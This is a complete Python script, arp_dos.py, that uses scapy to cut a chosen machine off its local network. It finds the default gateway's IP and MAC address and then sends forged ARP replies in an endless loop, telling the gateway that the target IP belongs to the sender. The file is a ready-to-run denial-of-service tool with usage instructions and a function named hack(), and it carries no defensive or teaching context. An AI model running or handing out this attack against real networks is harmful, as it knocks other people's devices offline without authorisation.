# coding:utf-8
# example :sudo  python arp_dos.py  192.168.1.103

from scapy.all import ARP, send
import os
import re
import sys


def get_gateway_ip():
    t = os.popen('route print')
    for i in t:
        if i.strip().startswith('0.0.0.0'):
            r = re.split("\s+", i.strip())
            return r[2]


def get_gateway_hw(ip):
    t = os.popen('arp -a %s' % ip)
    for i in t:
        if i.strip().startswith(ip):
            r = re.split("\s+", i.strip())
            return r[1]


def hack(hackip):
    ip = get_gateway_ip()
    hw = get_gateway_hw(ip)
    print(ip, hw)
    arp = ARP(op=2, pdst=ip, hwdst=hw, psrc=hackip)
    #os.popen('ifconfig eth0 %s' % hackip )
    while 1:
        send(arp)


def help():
    print("USEAGE: sudo python arp_dos.py 192.168.1.100")


def main():
    if len(sys.argv) != 2:
        help()
    else:
        hack(sys.argv[1])


if __name__ == "__main__":
    main()
